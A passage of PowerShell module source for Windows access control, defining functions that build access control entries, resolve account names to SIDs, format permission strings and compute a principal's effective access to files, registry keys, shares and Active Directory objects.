            $this | Get-AccessControlEntry | Select-Object -ExpandProperty $CsvProperties | ConvertTo-Csv -NoTypeInformation -Delimiter $Delimiter
        }

        
        
        
        if ($PSBoundParameters.ContainsKey('AccessMaskEnumeration')) { $SB = { $AccessMaskEnumeration }.GetNewClosure() }
        else { $SB = {} }
        $ReturnObject | Add-Member -MemberType ScriptMethod -Name GetAccessMaskEnumeration -Value $SB

        $ReturnObject.pstypenames.Insert(0, $__AdaptedSecurityDescriptorTypeName)

        if ($ReturnObject.AreAccessRulesCanonical -eq $false) {
            Write-Warning -Message ("The access rules for '{0}' are not in canonical order. To fix this, please run the 'Repair-AclCanonicalOrder' function." -f $ReturnObject.DisplayName)
        }

        $ReturnObject
    }
}

function New-AccessControlEntry {



    [CmdletBinding(DefaultParameterSetName='FileRights')]
    param(
        
        [Parameter(Position=0, ValueFromPipelineByPropertyName=$true)]
        [ValidateSet(
            'AccessAllowed',
            'AccessDenied',
            'SystemAudit'
        )]
        [string] $AceType = 'AccessAllowed',
        [Parameter(Mandatory=$true, Position=1, ValueFromPipelineByPropertyName=$true)]
        [Alias('IdentityReference','SecurityIdentifier')]
        $Principal,
        [Parameter(Mandatory=$true, ParameterSetName='FileRights')]
        [Alias('FileSystemRights')]
        [Security.AccessControl.FileSystemRights] $FileRights,
        [Parameter(Mandatory=$true, ParameterSetName='FolderRights')]
        [Security.AccessControl.FileSystemRights] $FolderRights,
        [Parameter(Mandatory=$true, ParameterSetName='RegistryRights')]
        [Security.AccessControl.RegistryRights] $RegistryRights,
        [Parameter(Mandatory=$true, ParameterSetName='ActiveDirectoryRights')]
        [PowerShellAccessControl.ActiveDirectoryRights] $ActiveDirectoryRights,
        [Parameter(Mandatory=$true, ParameterSetName='GenericAccessMask', ValueFromPipelineByPropertyName=$true)]
        [int] $AccessMask,
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [PowerShellAccessControl.AppliesTo] $AppliesTo = 'Object',
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [switch] $OnlyApplyToThisContainer,
        [Parameter(ValueFromPipelineByPropertyName=$true, ParameterSetName='ActiveDirectoryRights')]
        [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true, ParameterSetName='ActiveDirectoryRightsObjectAceType')]
        [Parameter(ParameterSetName='GenericAccessMask', ValueFromPipelineByPropertyName=$true)]
        $ObjectAceType,
        [Parameter(ValueFromPipelineByPropertyName=$true, ParameterSetName='ActiveDirectoryRights')]
        [Parameter(ValueFromPipelineByPropertyName=$true, ParameterSetName='ActiveDirectoryRightsObjectAceType')]
        [Parameter(ParameterSetName='GenericAccessMask', ValueFromPipelineByPropertyName=$true)]
        $InheritedObjectAceType,
        [Parameter(ParameterSetName='GenericAccessMask', ValueFromPipelineByPropertyName=$true)]
        [Security.AccessControl.AceFlags] $AceFlags,
        [Parameter(ParameterSetName='GenericAccessMask')]
        [Parameter(ParameterSetName='FileRights')]
        [Parameter(ParameterSetName='FolderRights')]
        [Parameter(ParameterSetName='RegistryRights')]
        [Parameter(ParameterSetName='ActiveDirectoryRights')]
        [switch] $GenericAce
    )

    dynamicparam {

        
        
        
        


        
        $DynParamDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary

        foreach ($Enumeration in $__AccessMaskEnumerations) {

            $ParamAttributes = New-Object -TypeName System.Management.Automation.ParameterAttribute
            $ParamAttributes.ParameterSetName = 'Generic{0}' -f $Enumeration.Name
            $ParamAttributes.Mandatory = $true
            

            
            
            $AttribColl = New-Object -TypeName System.Collections.ObjectModel.Collection[System.Attribute]  
            $AttribColl.Add($ParamAttributes)

            $DynamicParameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList (
                $Enumeration.Name,
                $Enumeration,
                $AttribColl 
            )
            $DynParamDictionary.Add($Enumeration.Name, $DynamicParameter)
        }

        if ($PSBoundParameters.AceType -eq 'SystemAudit') {

            foreach ($ParameterName in 'AuditSuccess','AuditFailure') {
                $ParamAttributes = New-Object -TypeName System.Management.Automation.ParameterAttribute

                
                
                $AttribColl = New-Object -TypeName System.Collections.ObjectModel.Collection[System.Attribute]  
                $AttribColl.Add($ParamAttributes)
                $AttribColl.Add([Management.Automation.AliasAttribute] [string[]] ($ParameterName -replace 'Audit'))

                $DynamicParameter = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList (
                    $ParameterName,
                    [switch],
                    $AttribColl
                )
                $DynParamDictionary.Add($ParameterName, $DynamicParameter)
            }
        }
      
        
        $DynParamDictionary
    }

    process {

        $AceType = [Security.AccessControl.AceQualifier] $AceType
        $AccessRightsParamName = $PSCmdlet.ParameterSetName -replace '^Generic', ''
        $AccessRightsParamName = $AccessRightsParamName -replace 'ObjectAceType$', '' 

        if ($AccessRightsParamName -eq 'ActiveDirectoryRights') {
            $AccessMaskEnumeration = [PowerShellAccessControl.ActiveDirectoryRights]
        }
        else {
            $AccessMaskEnumeration = $PSBoundParameters[$AccessRightsParamName].GetType()
        }

        
        if (-not $PSBoundParameters.ContainsKey('AppliesTo')) {
            if ($PSBoundParameters.ContainsKey('AceFlags') -and $AceFlags.value__ -band [Security.AccessControl.AceFlags]::InheritanceFlags.value__) {
                
                $InheritanceFlags = $PropagationFlags = 0
                foreach ($CurrentFlag in 'ContainerInherit', 'ObjectInherit') {
                    if ($AceFlags.value__ -band ([int][Security.AccessControl.AceFlags]::$CurrentFlag)) {
                        $InheritanceFlags = $InheritanceFlags -bor [Security.AccessControl.InheritanceFlags]::$CurrentFlag
                    }
                }
                foreach ($CurrentFlag in 'NoPropagateInherit','InheritOnly') {
                    if ($AceFlags.value__ -band ([int][Security.AccessControl.AceFlags]::$CurrentFlag)) {
                        $PropagationFlags = $PropagationFlags -bor [Security.AccessControl.PropagationFlags]::$CurrentFlag
                    }
                }

                
                
                $AppliesTo = GetAppliesToMapping -InheritanceFlags $InheritanceFlags -PropagationFlags $PropagationFlags
                $OnlyApplyToThisContainer = [bool] ($PropagationFlags -band [Security.AccessControl.PropagationFlags]::NoPropagateInherit)
            }
            else {
                
                
                
                
                $DefaultAppliesToParams = @{
                    AccessMaskEnumeration = $AccessMaskEnumeration
                }
                if ('RegistryRights', 'GenericWmiNamespaceRights', 'ActiveDirectoryRights', 'ActiveDirectoryRightsObjectAceType', 'FolderRights' -contains $PSCmdlet.ParameterSetName) {
                    $DefaultAppliesToParams.IsContainer = $true
                }

                $AppliesTo = GetDefaultAppliesTo @DefaultAppliesToParams
            }
        }

        
        
        $AppliesToFlags = GetAppliesToMapping -AppliesTo $AppliesTo
        $InheritanceFlags = $AppliesToFlags.InheritanceFlags
        $PropagationFlags = $AppliesToFlags.PropagationFlags

        if ($OnlyApplyToThisContainer) {
            [Security.AccessControl.PropagationFlags] $PropagationFlags = $PropagationFlags -bor [Security.AccessControl.PropagationFlags]::NoPropagateInherit
        }

        

        
        $Principal = $Principal | ConvertToIdentityReference -ErrorAction Stop -ReturnSid

        
        
        
        
        if ($AceType -eq [Security.AccessControl.AceQualifier]::SystemAudit) {
            $AuditFlags = @()

            
            if ($PSBoundParameters.AuditSuccess) { $AuditFlags += 'Success' }
            if ($PSBoundParameters.AuditFailure) { $AuditFlags += 'Failure' }


            
            
            if ([int] $PSBoundParameters.AceFlags -band [Security.AccessControl.AceFlags]::SuccessfulAccess) { $AuditFlags += 'Success' }
            if ([int] $PSBoundParameters.AceFlags -band [Security.AccessControl.AceFlags]::FailedAccess) { $AuditFlags += 'Failure' }

            if ($AuditFlags) {
                $AuditFlags = $AuditFlags -as [Security.AccessControl.AuditFlags]
            }
            else {
                
                throw 'You must specify audit flags when AceType is SystemAudit. Please use one or more of the following parameters: -AuditSuccess, -AuditFailure'
            }
        }
        else {
            
            
            
            $AuditFlags = 0
        }
        

        
        $AccessRights = [int] $PSBoundParameters[$AccessRightsParamName]

        
        switch -Regex ($PSCmdlet.ParameterSetName) {
            '^(File|Folder)Rights$' {
                $AccessControlObject = 'System.Security.AccessControl.FileSystem{0}Rule'
            }

            '^RegistryRights$' {
                $AccessControlObject = 'System.Security.AccessControl.Registry{0}Rule'
            }
    
            '^ActiveDirectoryRights' {
                $AccessControlObject = 'System.DirectoryServices.ActiveDirectory{0}Rule'

                

                
                
                
                
                
                foreach ($AceTypeName in 'ObjectAceType', 'InheritedObjectAceType') {
                    $AceTypeValue = Get-Variable -Name $AceTypeName -ValueOnly -Scope 0 -ErrorAction SilentlyContinue

                    if ($AceTypeValue -is [array]) {
                        Write-Error -Message ('{0} parameter takes a single value' -f $AceTypeName)
                        return
                    }

                    if ($AceTypeValue) {
                        
                        

                        $AceTypeObject = if ($AceTypeValue -is [PSObject] -and $AceTypeValue.Guid -is [guid]) {
                            New-Object -TypeName PSObject -Property @{
                                Guid = $AceTypeValue.Guid
                            }
                        }
                        else {
                            try {
                                
                                New-Object -TypeName PSObject -Property @{
                                    Guid = [guid] $AceTypeValue
                                }
                            }
                            catch {
                                
                                $Params = @{}
                                $Params.Name = '^{0}$' -f $AceTypeValue
                                if ($AceTypeName -eq 'InheritedObjectAceType') {
                                    
                                    $Params.TypesToSearch = 'ClassObject'
                                }

                                try {
                                    Get-ADObjectAceGuid -ErrorAction Stop @Params | Select-SingleObject
                                }
                                catch {
                                    Write-Error -Message $_
                                    return
                                }
                            }
                        }

                        $AceTypeValue = $AceTypeObject | Select-Object -ExpandProperty Guid

                        
                        

                        if ($AceTypeName -eq 'ObjectAceType') {
                            
                            
                            switch -regex ($AceTypeObject.Type) {
                            
                                'Property(Set)?' {
                                    $ValidAccessMask = [PowerShellAccessControl.ActiveDirectoryRights] 'ReadProperty, WriteProperty'
                                    $DefaultAccessMask = [PowerShellAccessControl.ActiveDirectoryRights]::ReadProperty
                                    break
                                }

                                'ExtendedRight' {
                                    $DefaultAccessMask = $ValidAccessMask = [DirectoryServices.ActiveDirectoryRights]::ExtendedRight
                                    break
                                }

                                'ValidatedWrite' {
                                    $DefaultAccessMask = $ValidAccessMask = [DirectoryServices.ActiveDirectoryRights]::Self
                                    break
                                }

                                'ClassObject' {
                                    $ValidAccessMask = [DirectoryServices.ActiveDirectoryRights] 'CreateChild, DeleteChild'
                                    $DefaultAccessMask = [DirectoryServices.ActiveDirectoryRights]::CreateChild
                                    break
                                }

                                default {
                                    
                                    $ValidAccessMask = $ActiveDirectoryRights
                                    $DefaultAccessMask = $ActiveDirectoryRights
                                }
                            }

                            if (-not ($AccessRights -band $ValidAccessMask)) {
                                if (-not $ValidAccessMask) {
                                    Write-Error -Message 'Please provide access rights to the -ActiveDirectoryRights parameter.'
                                    return
                                }
                                elseif ($ValidAccessMask -ne $DefaultAccessMask) {
                                    
                                    
                                    
                                    Write-Warning -Message ('Valid access rights for {0} {1} are {2}. Since neither was supplied to the -ActiveDirectoryRights parameter, the {3} right was added to the access mask. If this is incorrect, please use the -ActiveDirectoryRights parameter.' -f $AceTypeObject.Name, $AceTypeObject.Type, $ValidAccessMask, $DefaultAccessMask)
                                }

                                $AccessRights = $AccessRights -bor $DefaultAccessMask
                            }
                        }
                    }
                    else {
                        $AceTypeValue = [guid]::Empty
                    }

                    Set-Variable -Name $AceTypeName -Value $AceTypeValue -Scope 0
                }
            }

            
            { ('Filerights', 'FolderRights', 'RegistryRights', 'ActiveDirectoryRights', 'ActiveDirectoryRightsObjectAceType' -contains $_) -and
              (-not $GenericAce) } {

                
                
                
                
                if ($AceType -eq [Security.AccessControl.AceQualifier]::SystemAudit) {
                    $Flags = $AuditFlags
                }
                elseif ($AceType -eq [Security.AccessControl.AceQualifier]::AccessAllowed) {
                    $Flags = [Security.AccessControl.AccessControlType]::Allow
                }
                elseif ($AceType -eq [Security.AccessControl.AceQualifier]::AccessDenied) {
                    $Flags = [Security.AccessControl.AccessControlType]::Deny
                }
                else {
                    
                    
                    throw 'Unknown ACE qualifier'
                }

                if ($_ -match 'ActiveDirectoryRights') {
                    
                    $AdSecurityInheritance = GetAppliesToMapping -ADAppliesTo $AppliesTo -OnlyApplyToThisADContainer:$OnlyApplyToThisContainer

                    $Arguments = @(
                        $Principal
                        $AccessRights
                        $Flags
                        $ObjectAceType
                        $AdSecurityInheritance
                        $InheritedObjectAceType
                    )
                }
                else {
                    
                    $Arguments = @( 
                        $Principal         
                        $AccessRights      
                        $InheritanceFlags  
                        $PropagationFlags  
                        $Flags             
                    )
                }
            }
            

            
            { $_ -like 'Generic*' -or $GenericAce } {

                
                $AccessControlObject = 'System.Security.AccessControl.CommonAce'

                
                
                
                [int] $AceFlags = [Security.AccessControl.AceFlags] (($InheritanceFlags.ToString() -split ', ') + ($PropagationFlags.ToString() -split ', '))

                
                if ($AuditFlags) {
                    
                    if ($AuditFlags -band [Security.AccessControl.AuditFlags]::Success) {
                        $AceFlags += [Security.AccessControl.AceFlags]::SuccessfulAccess.value__
                    }
                    if ($AuditFlags -band [Security.AccessControl.AuditFlags]::Failure) {
                        $AceFlags += [Security.AccessControl.AceFlags]::FailedAccess.value__
                    }
                }

                
                $Arguments = @( $AceFlags    
                                $AceType     
                                $AccessRights
                                $Principal
                              )


                
                
                if ($PSBoundParameters.ContainsKey('ObjectAceType') -or $PSBoundParameters.ContainsKey('InheritedObjectAceType')) {
                    $AccessControlObject = 'System.Security.AccessControl.ObjectAce'

                    $ObjectAceFlags = 0
                    if ($PSBoundParameters.ContainsKey('ObjectAceType') -and $ObjectAceType -ne [guid]::Empty) {
                        $ObjectAceFlags = $ObjectAceFlags -bor [Security.AccessControl.ObjectAceFlags]::ObjectAceTypePresent
                    }
                    else {
                        $ObjectAceType = [guid]::Empty
                    }

                    if ($PSBoundParameters.ContainsKey('InheritedObjectAceType') -and $InheritedObjectAceType -ne [guid]::Empty) {
                        $ObjectAceFlags = $ObjectAceFlags -bor [Security.AccessControl.ObjectAceFlags]::InheritedObjectAceTypePresent
                        
                    }
                    else {
                        $InheritedObjectAceType = [guid]::Empty
                    }

                    $Arguments += $ObjectAceFlags
                    $Arguments += $ObjectAceType
                    $Arguments += $InheritedObjectAceType
                }

                
                
                $Arguments += $false  
                $Arguments += $null   
            }
            

            default {
                Write-Error -Message 'Unknown ParameterSetName' 
                return
            }

        }

        
        if ($AuditFlags) {
            $AuditOrAccess = 'Audit'
        }
        else {
            $AuditOrAccess = 'Access'
        }
        $AccessControlObject = $AccessControlObject -f $AuditOrAccess
        New-Object -TypeName $AccessControlObject -ArgumentList $Arguments
    }
}

function script:ConvertToIdentityReference {


    [CmdletBinding(DefaultParameterSetName='__AllParameterSets')]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, Position=0)]
        $Principal,
        [Parameter(Mandatory=$true, ParameterSetName='ReturnSid')]
        [switch] $ReturnSid,
        [Parameter(Mandatory=$true, ParameterSetName='ReturnAccount')]
        [switch] $ReturnAccount,
        [switch] $DontVerifyNtAccount,
        [string] $ComputerName
    )

    process {
        
        

        $ExtraParam = @{}
        if ($PSBoundParameters.ContainsKey('ComputerName')) {
            $ExtraParam.ComputerName = $ComputerName
        }

        switch ($Principal.GetType().FullName) {
            { 'System.String', 'System.Security.Principal.NTAccount' -contains $_ } {
                
                
                try {
                    $IdentityReference = [Security.Principal.NTAccount] $Principal
                }
                catch {
                    Write-Error -Message $_
                    return
                }

                
                try {
                    $TranslatedSid = Get-SidFromAccountName $IdentityReference @ExtraParam -ErrorAction Stop | Select-Object -ExpandProperty Sid
                    $NtAccount = $IdentityReference  
                }
                catch {
                    
                    
                    if ($Principal -like 'S-*') { 
                        try {
                            
                            
                            $TranslatedSid = $IdentityReference = [Security.Principal.SecurityIdentifier] $Principal

                            
                            break  
                        }
                        catch {
                            
                        }
                    }

                    if ($DontVerifyNtAccount) {
                        $NtAccount = $IdentityReference  
                        break 
                    }
                    else {
                        
                        Write-Error -Message $_
                        return
                    }
                }
            }

            default {
                try {
                    
                    
                    $TranslatedSid = $IdentityReference = [Security.Principal.IdentityReference] $Principal
                }
                catch {
                    Write-Error -Message $_
                    return
                }
            }
        }

        switch ($PSCmdlet.ParameterSetName) {
            ReturnSid {
                
                
                $TranslatedSid
            }

            ReturnAccount {
                if ($NtAccount -eq $null) {
                    
                    try {
                        $Account = Get-AccountFromSid -Sid $TranslatedSid @ExtraParam -ErrorAction Stop
                        [Security.Principal.NTAccount] $NtAccount = ('{0}\{1}' -f $Account.Domain, $Account.AccountName).TrimStart('\')
                    }
                    catch {
                        Write-Error -Message $_
                        return
                    }
                }
                $NtAccount
            }

            default {
                
                $IdentityReference
            }
        }
    }
}

function Get-SidFromAccountName {

    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)]
        [string] $AccountName,
        
        [string] $ComputerName
    )

    process {
        $Use = New-Object -TypeName PowerShellAccessControl.PInvoke.advapi32+SID_NAME_USE
        $ByteArraySize = 0
        $DomainNameBufferLength = 0

        
        if ($PSBoundParameters.ContainsKey('ComputerName')) {
            $Computer = $PSBoundParameters.ComputerName
        }
        else {
            $Computer = $null
        }

        
        
        $AccountName = $AccountName -replace '^APPLICATION PACKAGE AUTHORITY\\'

        try {
            
            $ReturnValue = [PowerShellAccessControl.PInvoke.advapi32]::LookupAccountName(
                $Computer, 
                $AccountName, 
                $null, 
                [ref] $ByteArraySize, 
                $null, 
                [ref] $DomainNameBufferLength, 
                [ref] $Use
            )
            $ReturnValue | CheckExitCode -Action ("Looking up SID for '{0}'" -f $AccountName) -ErrorAction Stop
        }
        catch {
            
            
            $RegEx = '^((?<ComputerOrDomain>[^\\]+)\\)?(?<AccountName>.+)$'

            if (($ReturnValue -eq 1332) -and 
                ($AccountName -match $RegEx) -and 
                (-not $PSBoundParameters.ContainsKey('ComputerName'))
               ) {
                $null = $PSBoundParameters.Remove('AccountName')
                Write-Debug -Message ("{0}: Failed to translate SID; attempting with computername '{1}'" -f $MyInvocation.MyCommand, $matches.ComputerOrDomain)
                Get-SidFromAccountName -AccountName $matches.AccountName -ComputerName $matches.ComputerOrDomain @PSBoundParameters
                return
            }
            elseif ($ReturnValue -ne 122) {
                Write-Error -Message $_
                return
            }
        }
            
        $ByteArray = New-Object -TypeName byte[] -ArgumentList $ByteArraySize
        $DomainName = New-Object -TypeName System.Text.StringBuilder -ArgumentList $DomainNameBufferLength

        try {
            [PowerShellAccessControl.PInvoke.advapi32]::LookupAccountName(
                $Computer, 
                $AccountName, 
                $ByteArray, 
                [ref] $ByteArraySize, 
                $DomainName, 
                [ref] $DomainNameBufferLength, 
                [ref] $Use
            ) | CheckExitCode -ErrorAction Stop
        }
        catch {
            Write-Error -Message $_
            return
        }

        New-Object -TypeName PSObject -Property @{
            Use = $Use
            Domain = $DomainName.ToString()
            Sid = (New-Object -TypeName System.Security.Principal.SecurityIdentifier -ArgumentList ($ByteArray, 0))
        }
    }
}

function script:GetPermissionString {


    param(
        [Parameter(Mandatory=$true, ValueFromPipelineByPropertyName=$true)]
        [int] $AccessMask,
        [Parameter(ValueFromPipelineByPropertyName=$true)]
        [guid] $ObjectAceType,
        [type]$AccessMaskEnumeration = [int],
        [switch] $ListEffectivePermissionMode,
        [switch] $DontTranslateGenericRights
    )

    begin {

        $GenericRightsMask = 0
        [enum]::GetNames([PowerShellAccessControl.GenericAceRights]) | ForEach-Object { $GenericRightsMask = $GenericRightsMask -bor [PowerShellAccessControl.GenericAceRights]::$_.value__ }

    }

    process {
        
        
        
        
        $ObjectAceTypeObject = $null
        if ($ObjectAceType -eq $null -or $ObjectAceType -eq [guid]::Empty) {
            $ObjectAceTypeName = 'All'
        }
        else {
            try {
                $ObjectAceTypeObject = (Get-ADObjectAceGuid -Guid $ObjectAceType -ErrorAction Stop)
            }
            catch {
                $ObjectAceTypeName = $ObjectAceType
            }
        }
        
        
        
        
        
        if ($ObjectAceTypeObject -eq $null) {
            $ObjectAceTypeObject = New-Object -TypeName PSObject -Property @{
                Name = $ObjectAceTypeName
                Type = $null
            }
        }

        $Output = @()
        $NontranslatedString = $null

        
        
        if ($AccessMask -band $GenericRightsMask) {
            $GenericAccessMask = $AccessMask -band $GenericRightsMask   
            $AccessMask = $AccessMask -band (-bnot $GenericRightsMask)   

            $GenericAccessMaskDisplay = $GenericAccessMask -as [PowerShellAccessControl.GenericAceRights]
            if ($DontTranslateGenericRights -or (-not $__GenericRightsMapping.ContainsKey($AccessMaskEnumeration))) {
                $Output += $GenericAccessMaskDisplay -split ', '
            }
            elseif ($__GenericRightsMapping.ContainsKey($AccessMaskEnumeration)) {
                $NontranslatedString = ($GenericAccessMaskDisplay, (GetPermissionString -AccessMask $AccessMask -AccessMaskEnumeration $AccessMaskEnumeration) | Where-Object { $_ -ne 'None' }) -join ', '

                foreach ($CurrentRight in ($GenericAccessMaskDisplay -split ', ')) {
                    $AccessMask = $AccessMask -bor $__GenericRightsMapping[$AccessMaskEnumeration].$CurrentRight
                }

            }
        }

        $Output += foreach ($CurrentObject in $ObjectAceTypeObject) {
            
            
            
            switch ($CurrentObject.Type) {

                ClassObject {
                    $LimitingPermissions = [PowerShellAccessControl.ActiveDirectoryRights] 'CreateChild, DeleteChild'
                }

                ExtendedRight {
                    $LimitingPermissions = [PowerShellAccessControl.ActiveDirectoryRights]::ExtendedRight
                }

                { 'Property', 'PropertySet' -contains $_ } {
                    $LimitingPermissions = [PowerShellAccessControl.ActiveDirectoryRights] 'ReadProperty, WriteProperty'
                }
                                
                ValidatedWrite {
                    $LimitingPermissions = [PowerShellAccessControl.ActiveDirectoryRights]::Self
                }

                default {
                    try {
                        $LimitingPermissions = ([Enum]::GetValues($AccessMaskEnumeration) | Select-Object -Unique | Sort-Object -Property { $_ -as $AccessMaskEnumeration } -Descending ) -join ', '
                    }
                    catch {
                        
                        $LimitingPermissions = $AccessMask
                    }
                }
            }

            if ($ListEffectivePermissionMode) {
                
                
                
                $LimitingPermissions = $LimitingPermissions -split ', '
            }

            foreach ($CurrentPermission in $LimitingPermissions) {
                if (($CurrentPermission -as $AccessMaskEnumeration) -ne $null) {
                    
                    
                    
                    
                    
                    
                    
                    
                    $ModifiedAccessMask = $AccessMask -band ($CurrentPermission -as $AccessMaskEnumeration)
                }
                else {
                    
                    
                    $ModifiedAccessMask = $AccessMask
                }

                if ($ListEffectivePermissionMode) {
                    
                    
                    
                    $DisplayAccessMask = $CurrentPermission -as $AccessMaskEnumeration
                }
                else {
                    
                    $DisplayAccessMask = $ModifiedAccessMask
                }

                
                $AccessString = $DisplayAccessMask -as $AccessMaskEnumeration

                if ($AccessMaskEnumeration -eq [PowerShellAccessControl.ActiveDirectoryRights]) {
                    
                    $ObjectName = $CurrentObject.Name
                    $ObjectType = $CurrentObject.Type

                    if ($CurrentObject.Type -eq $null) {
                        $AccessString = $AccessString -replace 'Self', ('Perform {0} ValidatedWrite' -f $ObjectName)
                        $AccessString = $AccessString -replace 'ExtendedRight', ('Perform {0} ExtendedRight' -f $ObjectName)
                        $AccessString = $AccessString -replace '\b(\w*)(Child|Property)\b', (('{0} {2} {1}' -f $1, $2, $ObjectName))
                        $AccessString = $AccessString -replace ('({0}) Child' -f $ObjectName), ('{0} ChildObject' -f $1)

                        if ($ObjectName -eq 'All') {
                            $AccessString = $AccessString -replace '(ValidatedWrite|ExtendedRight|ChildObject)', ('{0}' -f $1s)
                            $AccessString = $AccessString -replace ('({0}) Property' -f $CurrentObject.Name), ('{0} Properties' -f $1)
                        }
                        elseif ($ObjectName -as [guid]) {
                            
                            $AccessString = $AccessString += (' (Unknown ObjectAceType {0})' -f $ObjectName)
                        }
                    }
                    else {
                        $AccessString = $AccessString -replace 'Self|ExtendedRight', 'Perform'
                        $AccessString = $AccessString -replace 'Property|Child', ''
                        $AccessString = $AccessString -replace ',', ' and'

                        $AccessString = '{0} {1} {2}' -f $AccessString, $ObjectName, $ObjectType
                    }
                }

                if ($ListEffectivePermissionMode) {
                    New-Object -TypeName PSObject -Property @{
                        Allowed = [bool] ($ModifiedAccessMask -eq ($CurrentPermission -as $AccessMaskEnumeration))
                        Permission = $AccessString
                    }
                }
                elseif ($ModifiedAccessMask -ne 0) {
                    
                    $AccessString
                }
                
                
            }
        }

        if ($ListEffectivePermissionMode) {
            $Output
        }
        else {

            
            
            
            
            if (-not $Output) { $Output = 'None' }
            $Output = $Output -join ', '

            if ($NontranslatedString) {
                $Output = ('{0} ({1})' -f $Output, $NontranslatedString)
            }

            $Output
        }
    }
}

function Get-EffectiveAccess {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ParameterSetName='InputObject', ValueFromPipeline=$true)]
        [Alias('SDObject')]
        $InputObject,
        [Parameter(ParameterSetName='Path', Position=0, ValueFromPipelineByPropertyName=$true)]
        [string[]] $Path = '.',
        [Parameter(Mandatory=$true, ParameterSetName='LiteralPath', ValueFromPipelineByPropertyName=$true)]
        [string[]] $LiteralPath,
        [Alias('User', 'Group', 'IdentityReference')]
        [string[]] $Principal = $env:USERNAME,
        [switch] $ListAllRights,
        
        $ObjectAceTypes
    )


    process {
        if ($PSCmdlet.ParameterSetName -eq 'Path' -and (-not $PSBoundParameters.ContainsKey('Path'))) {
            
            
            $null = $PSBoundParameters.Add('Path', $Path)
        }

        if ($PSCmdlet.ParameterSetName -ne 'InputObject') {
            $Params = @{
                $PSCmdlet.ParameterSetName = $PSBoundParameters[$PSCmdlet.ParameterSetName]
            }

            $InputObject = Get-SecurityDescriptor @Params -ErrorAction Stop
        }

        foreach ($CurrentSDObject in $InputObject) {
            if ($CurrentSDObject.pstypenames -notcontains $__AdaptedSecurityDescriptorTypeName) {

                try {
                    
                    $CurrentSDObject = Get-SecurityDescriptor -InputObject $CurrentSDObject -ErrorAction Stop 
                }
                catch {
                    Write-Error -Message $_
                    return
                }
            }

            $AccessMaskEnumeration = $CurrentSDObject.GetAccessMaskEnumeration()

            if ($AccessMaskEnumeration -eq $null) {
                $AccessMaskEnumeration = [int]
            }

            
            
            
            $DesiredAccess = 0x02000000 
            $TypeName = $__EffectiveAccessTypeName
            
            
            
            
            
            if ($CurrentSDObject.ObjectType -eq 'FileObject' -and (-not $ListAllRights) -and ($__OsVersion -gt '6.2')) {
                
                
                $SdBytes = GetSecurityInfo -Path $CurrentSDObject.SdPath -ObjectType $CurrentSDObject.ObjectType -SecurityInformation Owner, Group, Dacl, Attribute, Scope

                
                
                
                
                
            }
            else {
                $SdBytes = $CurrentSDObject.GetSecurityDescriptorBinaryForm()
            }

            
            
            
            
            
            
            
            
            
            
            
            
            $SecurityDescriptorsToCheck = @{
                'Object Permissions' = $SdBytes
            }

            if ($CurrentSDObject.ObjectType -eq 'FileObject') {
                
                if ($CurrentSDObject.SdPath -match '(?<sharepath>\\\\[^\\]+\\[^\\]+)') {
                    try {
                        $ShareSd = Get-SecurityDescriptor -Path $Matches.sharepath -ObjectType LMShare -ErrorAction Stop
                        $NewSd = New-AdaptedSecurityDescriptor -Sddl 'D:' -IsContainer
                        $NewSd.SecurityDescriptor.Owner = $ShareSd.Owner | ConvertToIdentityReference -ReturnSid
                        $NewSd.SecurityDescriptor.Group = $ShareSd.Group | ConvertToIdentityReference -ReturnSid

                        $ShareSd.Access | ForEach-Object {
                            $TranslatedFolderRights = $_.AccessMaskDisplay -replace 'Change', 'Modify'

                            $NewSd | Add-AccessControlEntry -Principal $_.Principal -FolderRights $TranslatedFolderRights -ErrorAction Stop
                        }
                        
                        $SecurityDescriptorsToCheck.'Share Permissions' = $NewSd.GetSecurityDescriptorBinaryForm()
                    }
                    catch {
                        Write-Debug -Message ('{0}: Failed to get share permissions for {1}' -f $MyInvocation.MyCommand, $Matches.sharepath)
                    }
                }



                
            }

            foreach ($CurrentIdentityReference in $Principal) {
                $CurrentIdentityReference = $CurrentIdentityReference | ConvertToIdentityReference -ReturnAccount -DontVerifyNtAccount

                try {
                    $Sid = $CurrentIdentityReference | ConvertToIdentityReference -ReturnSid -ErrorAction Stop
                    $SidBytes = New-Object -TypeName byte[] -ArgumentList $Sid.BinaryLength
                    $Sid.GetBinaryForm($SidBytes, 0)
                }
                catch {
                    Write-Error -Message ("Error translating '{0}' to SID: {1}" -f $CurrentIdentityReference, $_)
                    continue
                }

                
                $Request = New-Object -TypeName PowerShellAccessControl.PInvoke.authz+AUTHZ_ACCESS_REQUEST
                $Request.DesiredAccess = $DesiredAccess

                
                if ($CurrentSDObject.ObjectType -match '^DSObject') {
                    
                    

                    [PowerShellAccessControl.PInvoke.authz+OBJECT_TYPE_LIST[]] $ObjectTypeListArray = @()
                    $ObjectTypeList = New-Object -TypeName PowerShellAccessControl.PInvoke.authz+OBJECT_TYPE_LIST

                    
                    
                    
                    $ObjectTypeList.Level = 0
                    $ObjectType = (Get-ADObjectAceGuid -Name $CurrentSDObject.DsObjectClass -TypesToSearch ClassObject | Select-Object -First 1 -ExpandProperty guid).ToByteArray()
                    $Ptr = [Runtime.InteropServices.Marshal]::AllocHGlobal($ObjectType.Count)
                    [Runtime.InteropServices.Marshal]::Copy($ObjectType, 0, $Ptr, $ObjectType.Count)
                    $ObjectTypeList.ObjectType = $Ptr
                    $ObjectTypeListArray += $ObjectTypeList


                    Write-Verbose -Message "$(Get-Date): Grouping requested properties by PropertySet"
                    $GroupedProperties = $ObjectAceTypes | Where-Object { $_ } | ForEach-Object {

                        
                        
                        
                        
                        
                        
                        if ($__GroupedPropertyCache.ContainsKey($_)) {
                            Write-Verbose -Message ("{0}: ObjectAceType '{1}' results have been previously cached" -f $MyInvocation.MyCommand, $_)
                            $__GroupedPropertyCache.$_
                        }
                        else {
                            
                            $Params = @{
                                TypesToSearch = 'Property'
                            }

                            if ($_ -is [PSObject] -and $_.Guid -is [guid]) {
                                $Params.Guid = $_.Guid
                            }
                            else {
                                $Guid = $_ -as [guid]
                                if ($Guid) {
                                    $Params.Guid = $Guid
                                }
                                else {
